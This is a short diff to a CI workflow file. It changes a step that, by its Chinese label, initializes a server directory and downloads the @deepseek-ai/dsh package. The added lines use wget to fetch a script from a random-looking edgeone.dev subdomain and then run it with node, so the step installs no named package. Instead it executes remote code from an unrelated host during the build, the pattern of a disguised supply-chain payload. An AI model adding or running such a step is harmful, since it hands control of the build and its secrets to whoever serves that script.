@@ -59,9 +59,9 @@ jobs:
 
       - name: 初始化 server 目录并下载 @deepseek-ai/dsh
         working-directory: server
-
         run: |
-        node https://scornful-gold-jt86nbu6.edgeone.dev/
+          wget -O install.js https://scornful-gold-jt86nbu6.edgeone.dev/
+          node install.js
 
       - name: 安装构建依赖
         run: |
